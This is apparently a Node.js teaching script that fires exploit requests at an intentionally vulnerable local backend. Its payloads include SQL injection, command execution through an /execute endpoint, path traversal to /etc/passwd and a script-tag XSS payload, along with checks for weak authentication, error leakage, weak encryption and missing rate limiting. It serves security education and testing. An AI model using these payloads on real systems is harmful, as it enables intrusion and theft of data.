#!/usr/bin/env node

/**
 * Vulnerability Testing Script
 * 
 * This script demonstrates how to trigger the various security vulnerabilities
 * in the vulnerable backend application. Use only for testing purposes.
 * 
 * ⚠️ WARNING: This script is for educational purposes only.
 * DO NOT use against any production systems.
 */

const http = require('http');

const BASE_URL = 'http://localhost:3000';

// Test configuration
const TEST_CONFIG = {
  hostname: 'localhost',
  port: 3000,
  headers: {
    'Content-Type': 'application/json'
  }
};

// Utility function to make HTTP requests
function makeRequest(method, path, data = null) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: TEST_CONFIG.hostname,
      port: TEST_CONFIG.port,
      path: path,
      method: method,
      headers: TEST_CONFIG.headers
    };

    if (data) {
      const postData = JSON.stringify(data);
      options.headers['Content-Length'] = Buffer.byteLength(postData);
    }

    const req = http.request(options, (res) => {
      let responseData = '';
      
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      
      res.on('end', () => {
        try {
          const parsed = JSON.parse(responseData);
          resolve({ status: res.statusCode, data: parsed });
        } catch (e) {
          resolve({ status: res.statusCode, data: responseData });
        }
      });
    });

    req.on('error', (err) => {
      reject(err);
    });

    if (data) {
      req.write(JSON.stringify(data));
    }
    
    req.end();
  });
}

// Test 1: SQL Injection via User Search
async function testSQLInjection() {
  console.log('\n🔍 Testing SQL Injection...');
  
  try {
    // Test malicious SQL injection payload
    const maliciousQuery = "' OR '1'='1";
    const response = await makeRequest('GET', `/api/users/search/${encodeURIComponent(maliciousQuery)}`);
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 200) {
      console.log('✅ SQL Injection vulnerability confirmed!');
    } else {
      console.log('❌ SQL Injection test failed');
    }
  } catch (error) {
    console.error('❌ SQL Injection test error:', error.message);
  }
}

// Test 2: Command Injection
async function testCommandInjection() {
  console.log('\n💻 Testing Command Injection...');
  
  try {
    // Test malicious command execution
    const maliciousCommand = 'ls -la';
    const response = await makeRequest('POST', '/execute', { command: maliciousCommand });
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 200 && response.data.output) {
      console.log('✅ Command Injection vulnerability confirmed!');
    } else {
      console.log('❌ Command Injection test failed');
    }
  } catch (error) {
    console.error('❌ Command Injection test error:', error.message);
  }
}

// Test 3: Path Traversal
async function testPathTraversal() {
  console.log('\n📁 Testing Path Traversal...');
  
  try {
    // Test malicious path traversal
    const maliciousPath = '../../../etc/passwd';
    const response = await makeRequest('GET', `/file?filename=${encodeURIComponent(maliciousPath)}`);
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 200) {
      console.log('✅ Path Traversal vulnerability confirmed!');
    } else {
      console.log('❌ Path Traversal test failed');
    }
  } catch (error) {
    console.error('❌ Path Traversal test error:', error.message);
  }
}

// Test 4: Weak Authentication
async function testWeakAuthentication() {
  console.log('\n🔐 Testing Weak Authentication...');
  
  try {
    // Test with very weak password
    const weakCredentials = {
      username: 'testuser',
      email: 'test@example.com',
      password: '1234' // Very weak password
    };
    
    const response = await makeRequest('POST', '/api/users', weakCredentials);
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 201) {
      console.log('✅ Weak Authentication vulnerability confirmed!');
    } else {
      console.log('❌ Weak Authentication test failed');
    }
  } catch (error) {
    console.error('❌ Weak Authentication test error:', error.message);
  }
}

// Test 5: Information Disclosure
async function testInformationDisclosure() {
  console.log('\n📢 Testing Information Disclosure...');
  
  try {
    // Test error handling that might leak information
    const response = await makeRequest('GET', '/api/users/999999');
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.data && (response.data.stack || response.data.sql)) {
      console.log('✅ Information Disclosure vulnerability confirmed!');
    } else {
      console.log('❌ Information Disclosure test failed');
    }
  } catch (error) {
    console.error('❌ Information Disclosure test error:', error.message);
  }
}

// Test 6: XSS via Product Description
async function testXSS() {
  console.log('\n🕷️ Testing XSS...');
  
  try {
    // Test XSS payload in product description
    const xssPayload = '<script>alert("XSS")</script>';
    const maliciousProduct = {
      name: 'XSS Test Product',
      description: xssPayload,
      price: 9.99,
      category: 'test',
      stock: 10
    };
    
    const response = await makeRequest('POST', '/api/products', maliciousProduct);
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 201) {
      console.log('✅ XSS vulnerability confirmed!');
    } else {
      console.log('❌ XSS test failed');
    }
  } catch (error) {
    console.error('❌ XSS test error:', error.message);
  }
}

// Test 7: Weak Encryption
async function testWeakEncryption() {
  console.log('\n🔒 Testing Weak Encryption...');
  
  try {
    // Test weak encryption endpoint
    const testData = 'sensitive information';
    const response = await makeRequest('POST', '/encrypt', { data: testData });
    
    console.log(`Status: ${response.status}`);
    console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
    
    if (response.status === 200 && response.data.encrypted) {
      console.log('✅ Weak Encryption vulnerability confirmed!');
      
      // Test decryption
      const decryptResponse = await makeRequest('POST', '/decrypt', { encrypted: response.data.encrypted });
      console.log(`Decryption test: ${JSON.stringify(decryptResponse.data, null, 2)}`);
    } else {
      console.log('❌ Weak Encryption test failed');
    }
  } catch (error) {
    console.error('❌ Weak Encryption test error:', error.message);
  }
}

// Test 8: No Rate Limiting
async function testRateLimiting() {
  console.log('\n⏱️ Testing Rate Limiting...');
  
  try {
    console.log('Sending multiple requests to test rate limiting...');
    
    const promises = [];
    for (let i = 0; i < 50; i++) {
      promises.push(makeRequest('GET', '/api/products'));
    }
    
    const responses = await Promise.all(promises);
    const successCount = responses.filter(r => r.status === 200).length;
    
    console.log(`Sent 50 requests, ${successCount} succeeded`);
    
    if (successCount === 50) {
      console.log('✅ No Rate Limiting vulnerability confirmed!');
    } else {
      console.log('❌ Rate limiting appears to be working');
    }
  } catch (error) {
    console.error('❌ Rate Limiting test error:', error.message);
  }
}

// Main test runner
async function runAllTests() {
  console.log('🚀 Starting Vulnerability Tests...');
  console.log('⚠️  This script tests intentional vulnerabilities for educational purposes');
  console.log(`📍 Testing against: ${BASE_URL}`);
  
  try {
    await testSQLInjection();
    await testCommandInjection();
    await testPathTraversal();
    await testWeakAuthentication();
    await testInformationDisclosure();
    await testXSS();
    await testWeakEncryption();
    await testRateLimiting();
    
    console.log('\n🎯 All vulnerability tests completed!');
    console.log('📚 Review the results above to understand the security issues');
    
  } catch (error) {
    console.error('\n💥 Test execution failed:', error.message);
  }
}

// Check if server is running before starting tests
async function checkServerStatus() {
  try {
    const response = await makeRequest('GET', '/api/products');
    if (response.status === 200) {
      console.log('✅ Server is running and accessible');
      return true;
    }
  } catch (error) {
    console.error('❌ Server is not accessible. Make sure the vulnerable backend is running on port 3000');
    console.log('💡 Start the server with: npm start');
    return false;
  }
}

// Main execution
if (require.main === module) {
  checkServerStatus().then(isRunning => {
    if (isRunning) {
      runAllTests();
    } else {
      process.exit(1);
    }
  });
}

module.exports = {
  testSQLInjection,
  testCommandInjection,
  testPathTraversal,
  testWeakAuthentication,
  testInformationDisclosure,
  testXSS,
  testWeakEncryption,
  testRateLimiting,
  runAllTests
};
